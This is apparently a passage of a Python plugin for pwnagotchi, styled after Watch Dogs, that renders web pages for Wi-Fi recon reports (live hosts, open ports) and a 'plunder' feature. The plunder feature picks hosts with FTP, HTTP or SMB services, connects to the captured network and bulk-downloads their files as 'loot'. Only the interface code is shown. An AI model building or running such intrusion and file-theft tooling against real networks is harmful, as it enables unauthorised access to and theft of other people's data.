            bssid = escape(rep.get("bssid") or "?")
            ip = escape(rep.get("ip") or "—")
            subnet = escape(rep.get("subnet") or "—")
            alive = len(rep.get("alive_hosts") or [])
            with_ports = len(rep.get("ports") or {})
            ts = time.strftime("%Y-%m-%d %H:%M", time.localtime(r["mtime"]))
            rows.append(
                "<div class='recon-row-wrap'>"
                "<a class='recon-row' href='/plugins/wd_scanner/recon/{name}'>"
                "  <header class='recon-row-h'>"
                "    <span class='recon-row-ssid'>{ssid}</span>"
                "    <span class='recon-row-ts'>{ts}</span>"
                "  </header>"
                "  <dl class='recon-row-meta'>"
                "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
                "    <div><dt>OUR IP</dt><dd>{ip}</dd></div>"
                "    <div><dt>SUBNET</dt><dd>{subnet}</dd></div>"
                "    <div><dt>ALIVE</dt><dd>{alive}</dd></div>"
                "    <div><dt>W/ PORTS</dt><dd>{wp}</dd></div>"
                "  </dl>"
                "</a>"
                "<form method='post' action='/plugins/wd_scanner/recon/delete' style='display:inline;' "
                "onsubmit='return confirm(\"Delete this recon report?\");'>"
                "{csrf}"
                "<input type='hidden' name='report' value='{name}'>"
                "<button type='submit' class='recon-delete-btn' title='Delete report'>&#x2715;</button>"
                "</form>"
                "</div>".format(
                    name=escape(r["name"]), ssid=ssid, bssid=bssid, ip=ip,
                    subnet=subnet, alive=alive, wp=with_ports, ts=ts, csrf=csrf_input,
                )
            )
        list_html = "\n".join(rows) if rows else (
            "<div class='empty'>"
            "<div class='empty-glyph'>&#x1f50d;</div>"
            "<p>// NO RECON REPORTS</p>"
            "<small>tap RECON on a PWNED card to start one</small>"
            "</div>"
        )

        running_panel = ""
        if running:
            running_panel = (
                "<div class='recon-panel'>"
                "  <div class='recon-h'>"
                "    <span class='recon-state run'>RUNNING</span>"
                "    <span class='mute'>recon in progress&hellip;</span>"
                "  </div>"
                "  <pre class='log'>{lines}</pre>"
                "</div>"
            ).format(lines=escape("\n".join(self._recon_log[-100:])))

        return self._chrome_page(
            title="recon reports",
            inner=(
                "<nav class='nav'>"
                "<a href='/plugins/wd_scanner/'>&larr; SCANNER</a>"
                "<a href='/plugins/wd_scanner/pwned'>VAULT</a>"
                "<a href='/plugins/wd_scanner/recon' class='active'>RECON "
                "<span class='count cyan'>{n}</span></a>"
                "</nav>"
                "<div id='wd-recon-live'>"
                "{running}"
                "<div class='section-h'>recon reports</div>"
                "{list_html}"
                "</div>"
                "<script>"
                "(function(){{"
                "  var el = document.getElementById('wd-recon-live');"
                "  function poll(){{"
                "    fetch(window.location.href, {{credentials:'same-origin'}})"
                "      .then(function(r){{ return r.ok ? r.text() : null; }})"
                "      .then(function(html){{"
                "        if(!html) return;"
                "        var doc = new DOMParser().parseFromString(html,'text/html');"
                "        var fresh = doc.getElementById('wd-recon-live');"
                "        if(fresh && el) el.innerHTML = fresh.innerHTML;"
                "      }})"
                "      .catch(function(){{}});"
                "  }}"
                "  setInterval(poll, 4000);"
                "}})();"
                "</script>"
            ).format(n=len(reports), running=running_panel, list_html=list_html),
            mark_color="cyan",
        )

    def _render_recon_detail(self, name, rep):
        ssid = escape(rep.get("ssid") or "?")
        bssid = escape(rep.get("bssid") or "?")
        ip = escape(rep.get("ip") or "—")
        gw = escape(rep.get("gateway") or "—")
        subnet = escape(rep.get("subnet") or "—")
        dur = rep.get("duration_seconds") or 0

        alive_hosts = rep.get("alive_hosts") or []
        ports_map = rep.get("ports") or {}
        names_map = rep.get("names") or {}

        host_rows = []
        for h in alive_hosts:
            ports = ports_map.get(h) or []
            ports_html = "<span class='mute'>—</span>" if not ports else (
                " ".join(
                    "<span class='port'>{p}/{pr}<i>{s}</i></span>".format(
                        p=p["port"], pr=escape(p["proto"]),
                        s=escape(p["service"]),
                    ) for p in ports
                )
            )
            host_rows.append(
                "<article class='host-row'>"
                "  <header class='host-h'>"
                "    <code class='host-ip'>{ip}</code>"
                "    <span class='host-name'>{nm}</span>"
                "  </header>"
                "  <div class='host-ports'>{ports}</div>"
                "</article>".format(
                    ip=escape(h),
                    nm=escape(names_map.get(h) or ""),
                    ports=ports_html,
                )
            )
        hosts_html = "\n".join(host_rows) or (
            "<div class='empty'>"
            "<p>// no live hosts</p></div>"
        )

        log_lines = escape("\n".join((rep.get("log") or [])[-200:]))

        # Build plunder button if there are plunderable services.
        plunder_ports = {21, 80, 139, 443, 445, 8080, 8443, 8000, 8888}
        plunder_services = {"ftp", "http", "https", "smb", "microsoft-ds", "netbios-ssn"}
        plunder_targets = []
        for h in alive_hosts:
            ports = ports_map.get(h) or []
            host_plunderable = []
            for p in ports:
                pnum = int(p.get("port") or 0)
                svc = (p.get("service") or "").lower()
                if pnum in plunder_ports or any(k in svc for k in plunder_services):
                    host_plunderable.append(p)
            if host_plunderable:
                plunder_targets.append({"ip": h, "ports": host_plunderable})

        plunder_btn = ""
        if plunder_targets:
            csrf_input = self._csrf_input()
            targets_json = json.dumps(plunder_targets)
            plunder_disabled = "disabled" if (
                self._plunder_running or self._action_running or self._recon_running
            ) else ""
            raw_bssid = rep.get("bssid") or ""
            raw_ssid = rep.get("ssid") or ""
            plunder_btn = (
                "<div class='plunder-section'>"
                "  <h3>&#x1f4e6; plunderable services found ({n} hosts)</h3>"
                "  <form method='POST' action='/plugins/wd_scanner/plunder'"
                "        onsubmit=\"return confirm('// PLUNDER\\nConnect to {ssid_js} and download data from {n} hosts?');\">"
                "    {csrf}"
                "    <input type='hidden' name='bssid' value='{bssid}'>"
                "    <input type='hidden' name='ssid' value='{ssid}'>"
                "    <input type='hidden' name='targets' value='{targets}'>"
                "    <button type='submit' class='btn plunder-btn' {disabled}>"
                "      &#x1f4e6; PLUNDER ALL"
                "    </button>"
                "  </form>"
                "</div>"
            ).format(
                n=len(plunder_targets),
                ssid=escape(raw_ssid),
                ssid_js=escape(raw_ssid).replace("'", ""),
                bssid=escape(raw_bssid),
                csrf=csrf_input,
                targets=escape(targets_json),
                disabled=plunder_disabled,
            )

        inner = (
            "<nav class='nav'>"
            "<a href='/plugins/wd_scanner/recon'>&larr; REPORTS</a>"
            "<a href='/plugins/wd_scanner/' class='active'>SCANNER</a>"
            "</nav>"
            "<div class='detail-card'>"
            "  <h2>{ssid}</h2>"
            "  <dl class='detail-meta'>"
            "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
            "    <div><dt>OUR IP</dt><dd>{ip}</dd></div>"
            "    <div><dt>GATEWAY</dt><dd>{gw}</dd></div>"
            "    <div><dt>SUBNET</dt><dd>{subnet}</dd></div>"
            "    <div><dt>DURATION</dt><dd>{dur}s</dd></div>"
            "    <div><dt>ALIVE</dt><dd>{alive}</dd></div>"
            "  </dl>"
            "</div>"
            "{plunder_btn}"
            "<div class='section-h'>hosts</div>"
            "{hosts}"
            "<div class='section-h'>log</div>"
            "<pre class='log'>{log}</pre>"
        ).format(
            ssid=ssid, bssid=bssid, ip=ip, gw=gw, subnet=subnet, dur=dur,
            alive=len(alive_hosts), hosts=hosts_html, log=log_lines,
            plunder_btn=plunder_btn,
        )

        return self._chrome_page(
            title="recon // " + (rep.get("ssid") or "?"),
            inner=inner,
            mark_color="cyan",
        )

    # ---------------------------------------------------------- plunder pages

    def _render_plunder_list(self):
        """Render the plunder overview page listing all jobs + running state."""
        jobs = self._list_plunder_jobs()
        running = self._plunder_running

        running_panel = ""
        if running:
            running_panel = (
                "<div class='recon-panel'>"
                "  <div class='recon-h'>"
                "    <span class='recon-state run'>RUNNING</span>"
                "    <span class='mute'>plunder in progress&hellip;</span>"
                "  </div>"
                "  <pre class='log'>{lines}</pre>"
                "</div>"
            ).format(lines=escape("\n".join(self._plunder_log[-100:])))

        rows = []
        for job in jobs:
            ssid = escape(job.get("ssid") or "?")
            bssid = escape(job.get("bssid") or "?")
            n_files = job.get("total_files", 0)
            n_bytes = self._human_bytes(job.get("total_bytes", 0))
            dur = job.get("duration_seconds", 0)
            ts = time.strftime("%Y-%m-%d %H:%M", time.localtime(job.get("ts", 0)))
            dir_name = escape(job.get("_dir", ""))
            n_targets = len(job.get("targets") or [])
            rows.append(
                "<a class='recon-row' href='/plugins/wd_scanner/plunder/{dir_name}'>"
                "  <header class='recon-row-h'>"
                "    <span class='recon-row-ssid'>{ssid}</span>"
                "    <span class='recon-row-ts'>{ts}</span>"
                "  </header>"
                "  <dl class='recon-row-meta'>"
                "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
                "    <div><dt>HOSTS</dt><dd>{n_targets}</dd></div>"
                "    <div><dt>FILES</dt><dd>{n_files}</dd></div>"
                "    <div><dt>SIZE</dt><dd>{n_bytes}</dd></div>"
                "    <div><dt>TIME</dt><dd>{dur}s</dd></div>"
                "  </dl>"
                "</a>".format(
                    dir_name=dir_name, ssid=ssid, bssid=bssid,
                    n_targets=n_targets, n_files=n_files, n_bytes=n_bytes,
                    dur=dur, ts=ts,
                )
            )

        list_html = "\n".join(rows) if rows else (
            "<div class='empty'>"
            "<div class='empty-glyph'>&#x1f4e6;</div>"
            "<p>// NO PLUNDER JOBS</p>"
            "<small>run PLUNDER from a recon report to download network data</small>"
            "</div>"
        )

        return self._chrome_page(
            title="plunder",
            inner=(
                "<nav class='nav'>"
                "<a href='/plugins/wd_scanner/'>&larr; SCANNER</a>"
                "<a href='/plugins/wd_scanner/recon'>RECON</a>"
                "<a href='/plugins/wd_scanner/plunder' class='active'>PLUNDER "
                "<span class='count cyan'>{n}</span></a>"
                "</nav>"
                "<div id='wd-plunder-live'>"
                "{running}"
                "<div class='section-h'>plunder jobs</div>"
                "{list_html}"
                "</div>"
                "<script>"
                "(function(){{"
                "  var el = document.getElementById('wd-plunder-live');"
                "  function poll(){{"
                "    fetch(window.location.href, {{credentials:'same-origin'}})"
                "      .then(function(r){{ return r.ok ? r.text() : null; }})"
                "      .then(function(html){{"
                "        if(!html) return;"
                "        var doc = new DOMParser().parseFromString(html,'text/html');"
                "        var fresh = doc.getElementById('wd-plunder-live');"
                "        if(fresh && el) el.innerHTML = fresh.innerHTML;"
                "      }})"
                "      .catch(function(){{}});"
                "  }}"
                "  setInterval(poll, 4000);"
                "}})();"
                "</script>"
            ).format(n=len(jobs), running=running_panel, list_html=list_html),
            mark_color="orange",
        )

    def _render_plunder_detail(self, dir_name):
        """Detail view for a single plunder job: summary + file list with download links."""
        job_path = os.path.join(self._plunder_dir(), dir_name)
        mf = os.path.join(job_path, "manifest.json")
        if not os.path.isfile(mf):
            from flask import abort
            return abort(404)
        try:
            with open(mf, "r") as f:
                manifest = json.load(f)
        except (OSError, ValueError):
            from flask import abort
            return abort(404)

        ssid = escape(manifest.get("ssid") or "?")
        bssid = escape(manifest.get("bssid") or "?")
        n_files = manifest.get("total_files", 0)
        n_bytes = self._human_bytes(manifest.get("total_bytes", 0))
        dur = manifest.get("duration_seconds", 0)
        ts = time.strftime("%Y-%m-%d %H:%M", time.localtime(manifest.get("ts", 0)))
        targets = manifest.get("targets") or []

        # Target summary cards.
        target_rows = []
        for t in targets:
            tip = escape(t.get("ip") or "?")
            services = t.get("services") or []
            svc_parts = []
            for s in services:
                svc_parts.append(
                    "<span class='loot-svc'>{type} :{port} &mdash; {files} files ({bytes})</span>".format(
                        type=escape(s.get("type", "?")),
                        port=s.get("port", 0),
                        files=s.get("files", 0),
                        bytes=escape(self._human_bytes(s.get("bytes", 0))),
                    )
                )
            target_rows.append(
                "<div class='loot-target'>"
                "  <div class='loot-ip'>{ip}</div>"
                "  <div class='loot-svcs'>{svcs}</div>"
                "</div>".format(ip=tip, svcs="\n".join(svc_parts))
            )

        # File list with download links.
        files = self._plunder_loot_files(job_path)
        file_rows = []
        for f in files[:500]:  # cap display
            dl_url = "/plugins/wd_scanner/plunder/%s/download/%s" % (
                escape(dir_name), escape(f["path"])
            )
            file_rows.append(
                "<a class='loot-file' href='{url}'>"
                "  <span class='loot-fname'>{path}</span>"
                "  <span class='loot-fsize'>{size}</span>"
                "</a>".format(
                    url=dl_url,
                    path=escape(f["path"]),
                    size=escape(self._human_bytes(f["size"])),
                )
            )
        file_html = "\n".join(file_rows) if file_rows else "<p class='mute'>no files captured</p>"

        # Plunder log.
        log_lines = manifest.get("log") or []
        log_html = escape("\n".join(log_lines[-100:]))

        return self._chrome_page(
            title="plunder // %s" % ssid,
            inner=(
                "<nav class='nav'>"
                "<a href='/plugins/wd_scanner/'>&larr; SCANNER</a>"
                "<a href='/plugins/wd_scanner/plunder'>&larr; PLUNDER</a>"
                "</nav>"
                "<div class='detail-meta'>"
                "  <div><dt>SSID</dt><dd>{ssid}</dd></div>"
                "  <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
                "  <div><dt>DATE</dt><dd>{ts}</dd></div>"
                "  <div><dt>DURATION</dt><dd>{dur}s</dd></div>"
                "  <div><dt>FILES</dt><dd>{n_files}</dd></div>"
                "  <div><dt>SIZE</dt><dd>{n_bytes}</dd></div>"
                "</div>"
                "<div class='section-h'>targets</div>"
                "<div class='loot-targets'>{target_rows}</div>"
                "<div class='section-h'>files ({n_files})</div>"
                "<div class='loot-files'>{file_html}</div>"
                "<div class='section-h'>plunder log</div>"
                "<pre class='log'>{log}</pre>"
            ).format(
                ssid=ssid, bssid=bssid, ts=ts, dur=dur,
                n_files=n_files, n_bytes=n_bytes,
                target_rows="\n".join(target_rows),
                file_html=file_html, log=log_html,
            ),
            mark_color="orange",
        )

    def _chrome_page(self, title, inner, mark_color="cyan"):
        """Shared dark Watch-Dogs chrome for the recon sub-pages."""
        return """\
<!doctype html>
<html lang='en'>
<head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1, viewport-fit=cover'>
<meta name='theme-color' content='#0a0d10'>
<title>ctOS // {title}</title>
<style>
:root {{
  --bg:#07090b; --panel:#111820; --grid:#1a232c;
  --fg:#d8e4ec; --mute:#6c7c89;
  --cyan:#00e5ff; --cyan-d:#00b8cc; --orange:#ff7a00; --green:#2bff88;
}}
* {{ box-sizing: border-box; }}
html,body {{ margin: 0; padding: 0; }}
body {{
  background:
    radial-gradient(1200px 600px at 50% -10%, rgba(0,229,255,.07), transparent 60%),
    repeating-linear-gradient(0deg, rgba(255,255,255,.015) 0 1px, transparent 1px 3px),
    var(--bg);
  color: var(--fg);
  font-family: ui-monospace, "JetBrains Mono", "Fira Code", Menlo, Consolas, monospace;
  font-size: 14px; line-height: 1.4; min-height: 100vh;
  padding: env(safe-area-inset-top) env(safe-area-inset-right)
           env(safe-area-inset-bottom) env(safe-area-inset-left);
}}
body::before {{
  content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 50;
  background: repeating-linear-gradient(180deg, rgba(0,0,0,.18) 0 1px, transparent 1px 3px);
  mix-blend-mode: multiply;
}}
.wrap {{ max-width: 720px; margin: 0 auto; padding: 12px; }}
.brand {{
  display: flex; align-items: center; gap: 10px;
  padding: 10px 12px; margin-bottom: 10px;
  border: 1px solid var(--grid);
  background: linear-gradient(180deg, #0e141a, #0a0e12);
  clip-path: polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%);
}}
.brand .mark {{
  width: 28px; height: 28px; display: grid; place-items: center;
  border: 1px solid var(--{mark}); color: var(--{mark});
  font-weight: 700; text-shadow: 0 0 6px rgba(0,229,255,.6);
}}
.brand h1 {{ margin: 0; font-size: 14px; letter-spacing: .25em; text-transform: uppercase; color: var(--fg); }}
.brand h1 b {{ color: var(--{mark}); }}
.brand .sub {{ margin-left: auto; font-size: 11px; color: var(--mute); letter-spacing: .2em; }}

.nav {{ display: flex; gap: 8px; margin: 0 0 12px; flex-wrap: wrap; }}
.nav a {{
  flex: 1; min-width: 110px;
  display: inline-flex; align-items: center; justify-content: center;
  height: 36px; padding: 0 10px;
  font: inherit; font-weight: 700; letter-spacing: .2em; text-transform: uppercase;
  background: transparent; color: var(--cyan);
  border: 1px solid var(--grid); text-decoration: none;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
}}
.nav a.active {{ border-color: var(--cyan); background: #06292e; }}
.nav .count {{
  display: inline-block; padding: 1px 6px; margin-left: 6px;
  background: var(--green); color: #002912;
  font-weight: 700; font-size: 10px; letter-spacing: .15em;
}}
.nav .count.cyan {{ background: var(--cyan); color: #002a30; }}

.section-h {{
  margin: 12px 0 8px; font-size: 11px; letter-spacing: .3em;
  color: var(--mute); text-transform: uppercase;
  display: flex; align-items: center; gap: 8px;
}}
.section-h::before, .section-h::after {{
  content: ''; flex: 1; height: 1px; background: var(--grid);
}}

.recon-row-wrap {{
  position: relative; margin-bottom: 8px;
}}
.recon-row {{
  display: block; text-decoration: none; color: var(--fg);
  background: linear-gradient(180deg, #0d1318, #0a0d11);
  border: 1px solid var(--grid); padding: 10px 12px;
  position: relative;
  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
}}
.recon-row:hover {{ border-color: var(--cyan); }}
.recon-row::before {{
  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px; background: var(--cyan); box-shadow: 0 0 10px rgba(0,229,255,.4);
}}
.recon-delete-btn {{
  position: absolute; top: 10px; right: 10px;
  width: 28px; height: 28px;
  display: flex; align-items: center; justify-content: center;
  background: #1a0007; color: var(--red); border: 1px solid var(--red);
  font-size: 14px; font-weight: 700; cursor: pointer;
  clip-path: polygon(4px 0, 100% 0, 100% calc(100% - 4px), calc(100% - 4px) 100%, 0 100%, 0 4px);
  transition: background .12s, transform .08s;
  z-index: 10;
}}
.recon-delete-btn:hover {{ background: #2a000c; transform: scale(1.05); }}
.recon-delete-btn:active {{ transform: scale(0.95); }}
.recon-row-h {{
  display: flex; align-items: baseline; justify-content: space-between;
  gap: 10px; margin-bottom: 6px;
}}
.recon-row-ssid {{ font-weight: 700; color: var(--cyan); font-size: 15px; }}
.recon-row-ts {{ color: var(--mute); font-size: 11px; }}
.recon-row-meta {{
  display: grid; grid-template-columns: 1fr 1fr; gap: 4px 10px; margin: 0;
}}
.recon-row-meta dt {{ font-size: 10px; letter-spacing: .25em; color: var(--mute); }}
.recon-row-meta dd {{ margin: 1px 0 0; }}
.recon-row-meta code {{ color: var(--cyan); }}

.detail-card {{
  background: linear-gradient(180deg, #0d1318, #0a0d11);
  border: 1px solid var(--cyan); padding: 12px;
  margin-bottom: 8px;
  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
}}
.detail-card h2 {{ margin: 0 0 8px; color: var(--cyan); font-size: 16px; word-break: break-all; }}
.detail-meta {{
  display: grid; grid-template-columns: 1fr 1fr; gap: 6px 10px; margin: 0;
}}
.detail-meta dt {{ font-size: 10px; letter-spacing: .25em; color: var(--mute); }}
.detail-meta dd {{ margin: 1px 0 0; }}
.detail-meta code {{ color: var(--cyan); }}

.host-row {{
  background: #0a0e12; border: 1px solid var(--grid);
  padding: 8px 10px; margin-bottom: 6px;
  clip-path: polygon(0 0, calc(100% - 8px) 0, 100% 8px, 100% 100%, 8px 100%, 0 calc(100% - 8px));
}}
.host-h {{ display: flex; gap: 10px; align-items: baseline; margin-bottom: 4px; flex-wrap: wrap; }}
.host-ip {{ color: var(--cyan); font-size: 14px; font-weight: 700; }}
.host-name {{ color: var(--mute); font-size: 12px; word-break: break-all; }}
.host-ports {{ display: flex; flex-wrap: wrap; gap: 4px; }}
.port {{
  background: #06292e; color: var(--cyan); border: 1px solid var(--cyan-d);
  padding: 2px 6px; font-size: 11px; letter-spacing: .08em;
}}
.port i {{ font-style: normal; color: var(--mute); margin-left: 6px; }}

.log {{
  margin: 0;
  background: #04070a; color: #b5e6ee;
  border: 1px solid var(--grid);
  padding: 10px 12px; font-size: 12px; line-height: 1.5;
  max-height: 320px; overflow: auto;
  white-space: pre-wrap; word-break: break-all;
}}
.empty {{ text-align: center; padding: 30px 12px; border: 1px dashed var(--grid); color: var(--mute); }}
.empty-glyph {{ font-size: 38px; color: var(--cyan); opacity: .6; }}
.empty p {{ margin: 8px 0 4px; letter-spacing: .25em; color: var(--fg); }}
.recon-panel {{
  border: 1px solid var(--cyan-d);
  background: linear-gradient(180deg, #04161a, #07090b);
  padding: 10px 12px; margin-bottom: 12px;
  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
}}
.recon-h {{
  display: flex; align-items: center; justify-content: space-between;
  gap: 10px; margin-bottom: 8px;
}}
.recon-state {{
  font-size: 11px; letter-spacing: .25em; padding: 2px 8px;
  border: 1px solid var(--grid);
}}
.recon-state.run {{
  color: var(--green); border-color: var(--green);
  text-shadow: 0 0 6px rgba(43,255,136,.5);
}}
.recon-state.idle {{ color: var(--mute); }}
.mute {{ color: var(--mute); font-size: 11px; letter-spacing: .15em; }}

@media (min-width: 560px) {{
  body {{ font-size: 15px; }}
  .recon-row-meta, .detail-meta {{ grid-template-columns: repeat(4, 1fr); }}
}}

footer.tag {{ margin: 16px 0 8px; text-align: center; color: var(--mute); font-size: 10px; letter-spacing: .35em; }}

/* ---- plunder styles ---- */
.plunder-section {{
  margin: 12px 0; padding: 12px;
  border: 1px solid var(--orange);
  background: linear-gradient(180deg, rgba(255,122,0,.06), transparent);
  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
}}
.plunder-section h3 {{
  margin: 0 0 8px; font-size: 12px; letter-spacing: .2em;
  text-transform: uppercase; color: var(--orange);
}}
.plunder-btn {{
  display: inline-flex; align-items: center; justify-content: center;
  gap: 6px; height: 44px; padding: 0 18px;
  font: inherit; font-size: 13px; letter-spacing: .1em; text-transform: uppercase;
  color: var(--orange); background: rgba(255,122,0,.1);
  border: 1px solid var(--orange); cursor: pointer;
  clip-path: polygon(6px 0, 100% 0, 100% calc(100% - 6px), calc(100% - 6px) 100%, 0 100%, 0 6px);
}}
.plunder-btn:hover {{ background: rgba(255,122,0,.2); }}
.plunder-btn:disabled {{ opacity: .4; pointer-events: none; }}

.loot-targets {{ display: grid; gap: 8px; margin-bottom: 12px; }}
.loot-target {{
  padding: 8px 12px; border: 1px solid var(--grid);
  background: var(--panel);
}}
.loot-ip {{ font-weight: 700; color: var(--cyan); margin-bottom: 4px; }}
.loot-svcs {{ display: flex; flex-direction: column; gap: 2px; }}
.loot-svc {{ font-size: 12px; color: var(--fg); letter-spacing: .08em; }}
.loot-files {{ display: flex; flex-direction: column; gap: 4px; margin-bottom: 12px; max-height: 400px; overflow: auto; }}
.loot-file {{
  display: flex; justify-content: space-between; align-items: center;
  padding: 6px 10px; border: 1px solid var(--grid); background: var(--panel);
  text-decoration: none; color: var(--fg);
}}
.loot-file:hover {{ border-color: var(--cyan); }}
.loot-fname {{ font-size: 12px; word-break: break-all; flex: 1; }}
.loot-fsize {{ font-size: 11px; color: var(--mute); margin-left: 8px; white-space: nowrap; }}
</style>
</head>
<body>
<div class='wrap'>
  <div class='brand'>
    <div class='mark'>&#x1f50d;</div>
    <h1>ct<b>OS</b> // {title}</h1>
    <span class='sub'>DedSec</span>
  </div>
  {inner}
  <footer class='tag'>// the truth will set us free //</footer>
</div>
</body></html>
""".format(title=escape(title), inner=inner, mark=mark_color)


def pwnagotchi_config_main_iface():
    """Look up the primary monitor interface pwnagotchi is told to use."""
    try:
        import pwnagotchi
        cfg = getattr(pwnagotchi, "config", None) or {}
        return ((cfg.get("main") or {}).get("iface")
                or (cfg.get("main") or {}).get("interface"))
    except Exception:
        return None
